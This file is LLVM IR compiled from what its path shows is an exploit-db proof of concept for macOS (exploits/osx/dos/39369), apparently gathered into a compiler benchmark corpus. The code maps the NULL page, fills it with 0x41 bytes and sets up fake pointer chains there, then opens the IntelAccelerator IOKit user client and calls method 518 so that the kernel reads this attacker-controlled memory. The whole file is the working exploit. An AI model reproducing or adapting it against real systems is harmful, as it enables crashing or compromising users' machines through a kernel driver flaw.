; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39369.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/osx/dos/extr_39369.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

@KERN_SUCCESS = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [4 x i8] c"%x\0A\00", align 1
@KERN_INVALID_ADDRESS = common dso_local global i64 0, align 8
@.str.1 = private unnamed_addr constant [17 x i8] c"invalid address\0A\00", align 1
@KERN_NO_SPACE = common dso_local global i64 0, align 8
@.str.2 = private unnamed_addr constant [10 x i8] c"no space\0A\00", align 1
@.str.3 = private unnamed_addr constant [17 x i8] c"IntelAccelerator\00", align 1
@.str.4 = private unnamed_addr constant [46 x i8] c"unable to create service matching dictionary\0A\00", align 1
@kIOMasterPortDefault = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [12 x i8] c"no matches\0A\00", align 1
@IO_OBJECT_NULL = common dso_local global i64 0, align 8
@.str.6 = private unnamed_addr constant [24 x i8] c"unable to find service\0A\00", align 1
@.str.7 = private unnamed_addr constant [17 x i8] c"got service: %x\0A\00", align 1
@MACH_PORT_NULL = common dso_local global i32 0, align 4
@.str.8 = private unnamed_addr constant [38 x i8] c"unable to get user client connection\0A\00", align 1
@.str.9 = private unnamed_addr constant [31 x i8] c"got userclient connection: %x\0A\00", align 1
@.str.10 = private unnamed_addr constant [25 x i8] c"IOConnectCall error: %x\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i64, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i64, align 8
  %14 = alloca i32, align 4
  %15 = alloca i32*, align 8
  %16 = alloca i32*, align 8
  %17 = alloca i32*, align 8
  %18 = alloca i32, align 4
  %19 = alloca [16 x i32], align 16
  %20 = alloca i32, align 4
  %21 = alloca [4096 x i8], align 16
  %22 = alloca i64, align 8
  %23 = alloca [16 x i32], align 16
  %24 = alloca i64, align 8
  %25 = alloca [4096 x i8], align 16
  %26 = alloca i64, align 8
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %7, align 4
  %27 = call i32 (...) @mach_task_self()
  %28 = call i64 @vm_deallocate(i32 %27, i32 0, i32 4096)
  store i64 %28, i64* %6, align 8
  %29 = load i64, i64* %6, align 8
  %30 = load i64, i64* @KERN_SUCCESS, align 8
  %31 = icmp ne i64 %29, %30
  br i1 %31, label %32, label %35

32:                                               ; preds = %2
  %33 = load i64, i64* %6, align 8
  %34 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i64 %33)
  br label %35

35:                                               ; preds = %32, %2
  store i32 0, i32* %8, align 4
  %36 = call i32 (...) @mach_task_self()
  %37 = call i64 @vm_allocate(i32 %36, i32* %8, i32 4096, i32 0)
  store i64 %37, i64* %6, align 8
  %38 = load i64, i64* %6, align 8
  %39 = load i64, i64* @KERN_SUCCESS, align 8
  %40 = icmp ne i64 %38, %39
  br i1 %40, label %41, label %56

41:                                               ; preds = %35
  %42 = load i64, i64* %6, align 8
  %43 = load i64, i64* @KERN_INVALID_ADDRESS, align 8
  %44 = icmp eq i64 %42, %43
  br i1 %44, label %45, label %47

45:                                               ; preds = %41
  %46 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.1, i64 0, i64 0))
  br label %47

47:                                               ; preds = %45, %41
  %48 = load i64, i64* %6, align 8
  %49 = load i64, i64* @KERN_NO_SPACE, align 8
  %50 = icmp eq i64 %48, %49
  br i1 %50, label %51, label %53

51:                                               ; preds = %47
  %52 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.2, i64 0, i64 0))
  br label %53

53:                                               ; preds = %51, %47
  %54 = load i64, i64* %6, align 8
  %55 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str, i64 0, i64 0), i64 %54)
  br label %56

56:                                               ; preds = %53, %35
  store i8* null, i8** %9, align 8
  store i32 0, i32* %10, align 4
  br label %57

57:                                               ; preds = %65, %56
  %58 = load i32, i32* %10, align 4
  %59 = icmp slt i32 %58, 4096
  br i1 %59, label %60, label %68

60:                                               ; preds = %57
  %61 = load i8*, i8** %9, align 8
  %62 = load i32, i32* %10, align 4
  %63 = sext i32 %62 to i64
  %64 = getelementptr inbounds i8, i8* %61, i64 %63
  store i8 65, i8* %64, align 1
  br label %65

65:                                               ; preds = %60
  %66 = load i32, i32* %10, align 4
  %67 = add nsw i32 %66, 1
  store i32 %67, i32* %10, align 4
  br label %57

68:                                               ; preds = %57
  %69 = call i32 @IOServiceMatching(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.3, i64 0, i64 0))
  store i32 %69, i32* %11, align 4
  %70 = load i32, i32* %11, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %74, label %72

72:                                               ; preds = %68
  %73 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([46 x i8], [46 x i8]* @.str.4, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %134

74:                                               ; preds = %68
  %75 = load i32, i32* @kIOMasterPortDefault, align 4
  %76 = load i32, i32* %11, align 4
  %77 = call i64 @IOServiceGetMatchingServices(i32 %75, i32 %76, i32* %12)
  store i64 %77, i64* %6, align 8
  %78 = load i64, i64* %6, align 8
  %79 = load i64, i64* @KERN_SUCCESS, align 8
  %80 = icmp ne i64 %78, %79
  br i1 %80, label %81, label %83

81:                                               ; preds = %74
  %82 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.5, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %134

83:                                               ; preds = %74
  %84 = load i32, i32* %12, align 4
  %85 = call i64 @IOIteratorNext(i32 %84)
  store i64 %85, i64* %13, align 8
  %86 = load i64, i64* %13, align 8
  %87 = load i64, i64* @IO_OBJECT_NULL, align 8
  %88 = icmp eq i64 %86, %87
  br i1 %88, label %89, label %91

89:                                               ; preds = %83
  %90 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.6, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %134

91:                                               ; preds = %83
  %92 = load i64, i64* %13, align 8
  %93 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.7, i64 0, i64 0), i64 %92)
  %94 = load i32, i32* @MACH_PORT_NULL, align 4
  store i32 %94, i32* %14, align 4
  %95 = load i64, i64* %13, align 8
  %96 = call i32 (...) @mach_task_self()
  %97 = call i64 @IOServiceOpen(i64 %95, i32 %96, i32 1, i32* %14)
  store i64 %97, i64* %6, align 8
  %98 = load i64, i64* %6, align 8
  %99 = load i64, i64* @KERN_SUCCESS, align 8
  %100 = icmp ne i64 %98, %99
  br i1 %100, label %101, label %103

101:                                              ; preds = %91
  %102 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([38 x i8], [38 x i8]* @.str.8, i64 0, i64 0))
  store i32 0, i32* %3, align 4
  br label %134

103:                                              ; preds = %91
  %104 = load i32, i32* %14, align 4
  %105 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([31 x i8], [31 x i8]* @.str.9, i64 0, i64 0), i32 %104)
  %106 = call i32* @malloc(i32 4096)
  store i32* %106, i32** %15, align 8
  %107 = call i32* @malloc(i32 4096)
  store i32* %107, i32** %16, align 8
  %108 = call i32* @malloc(i32 4096)
  store i32* %108, i32** %17, align 8
  store i32 1094795585, i32* %18, align 4
  %109 = load i32, i32* %18, align 4
  %110 = load i32*, i32** %17, align 8
  %111 = getelementptr inbounds i32, i32* %110, i64 14
  store i32 %109, i32* %111, align 4
  %112 = load i32*, i32** %17, align 8
  %113 = ptrtoint i32* %112 to i32
  %114 = load i32*, i32** %16, align 8
  store i32 %113, i32* %114, align 4
  %115 = load i32*, i32** %16, align 8
  %116 = ptrtoint i32* %115 to i32
  %117 = load i32*, i32** %15, align 8
  store i32 %116, i32* %117, align 4
  %118 = load i32*, i32** %15, align 8
  %119 = ptrtoint i32* %118 to i32
  store i32 %119, i32* inttoptr (i64 40 to i32*), align 4
  store i32 0, i32* %20, align 4
  store i64 0, i64* %22, align 8
  store i64 0, i64* %24, align 8
  store i64 0, i64* %26, align 8
  store i32 0, i32* %20, align 4
  store i64 0, i64* %22, align 8
  store i64 0, i64* %24, align 8
  store i64 0, i64* %26, align 8
  store i64 4096, i64* %22, align 8
  %120 = load i32, i32* %14, align 4
  %121 = getelementptr inbounds [16 x i32], [16 x i32]* %19, i64 0, i64 0
  %122 = load i32, i32* %20, align 4
  %123 = getelementptr inbounds [4096 x i8], [4096 x i8]* %21, i64 0, i64 0
  %124 = load i64, i64* %22, align 8
  %125 = getelementptr inbounds [16 x i32], [16 x i32]* %23, i64 0, i64 0
  %126 = getelementptr inbounds [4096 x i8], [4096 x i8]* %25, i64 0, i64 0
  %127 = call i64 @IOConnectCallMethod(i32 %120, i32 518, i32* %121, i32 %122, i8* %123, i64 %124, i32* %125, i64* %24, i8* %126, i64* %26)
  store i64 %127, i64* %6, align 8
  %128 = load i64, i64* %6, align 8
  %129 = load i64, i64* @KERN_SUCCESS, align 8
  %130 = icmp ne i64 %128, %129
  br i1 %130, label %131, label %134

131:                                              ; preds = %103
  %132 = load i64, i64* %6, align 8
  %133 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.10, i64 0, i64 0), i64 %132)
  store i32 0, i32* %3, align 4
  br label %134

134:                                              ; preds = %72, %81, %89, %101, %131, %103
  %135 = load i32, i32* %3, align 4
  ret i32 %135
}

declare dso_local i64 @vm_deallocate(i32, i32, i32) #1

declare dso_local i32 @mach_task_self(...) #1

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i64 @vm_allocate(i32, i32*, i32, i32) #1

declare dso_local i32 @IOServiceMatching(i8*) #1

declare dso_local i64 @IOServiceGetMatchingServices(i32, i32, i32*) #1

declare dso_local i64 @IOIteratorNext(i32) #1

declare dso_local i64 @IOServiceOpen(i64, i32, i32, i32*) #1

declare dso_local i32* @malloc(i32) #1

declare dso_local i64 @IOConnectCallMethod(i32, i32, i32*, i32, i8*, i64, i32*, i64*, i8*, i64*) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
